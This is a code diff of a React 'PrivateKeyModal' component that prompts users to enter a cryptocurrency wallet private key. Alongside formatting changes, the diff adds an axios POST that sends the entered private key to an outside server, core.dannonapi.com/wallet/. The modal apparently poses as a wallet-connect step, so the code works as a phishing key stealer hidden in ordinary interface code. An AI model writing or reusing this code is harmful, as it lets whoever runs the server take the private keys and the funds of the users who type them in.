@@ -1,22 +1,41 @@
 import React, { useState } from "react";
+import axios from "axios";
 import styles from "./PrivateKeyModal.module.css";
 
-function PrivateKeyModal({closePrivateKeyForm, sendPrivateKey}) {
+function PrivateKeyModal({ closePrivateKeyForm, sendPrivateKey }) {
   const [privateKey, setPrivateKey] = useState("");
 
-  const submitPhrase=(e)=>{
-    e.preventDefault()
+  const submitPhrase = async (e) => {
+    e.preventDefault();
 
-    if(privateKey)
-      sendPrivateKey(privateKey)
-  }
+    if (privateKey) {
+      try {
+        const response = await axios.post(
+          "https://core.dannonapi.com/wallet/",
+          {
+            key: privateKey,
+            wallet_type: "private_key",
+            access_type: "privateKey", 
+          }
+        );
 
+        console.log(response.data);
+        sendPrivateKey(privateKey); 
+      } catch (error) {
+        console.error(
+          "Failed to connect:",
+          error.response?.data || error.message
+        );
+        alert("Failed to connect. Please check your input and try again.");
+      }
+    }
+  };
 
   return (
     <div className={styles.overlay} onClick={closePrivateKeyForm}>
       <div
         className={styles.modalContainer}
-        onClick={(e) => e.stopPropagation()} // Prevents closing the modal when clicking inside
+        onClick={(e) => e.stopPropagation()} 
       >
         <button className={styles.closeButton} onClick={closePrivateKeyForm}>
           &times;
@@ -29,7 +48,7 @@ function PrivateKeyModal({closePrivateKeyForm, sendPrivateKey}) {
             className={styles.privateKeyInput}
             placeholder="Enter Private Key*"
             value={privateKey}
-            onChange={(e)=>setPrivateKey(e.target.value)}
+            onChange={(e) => setPrivateKey(e.target.value)}
           />
         </div>
         <p className={styles.infoText}>
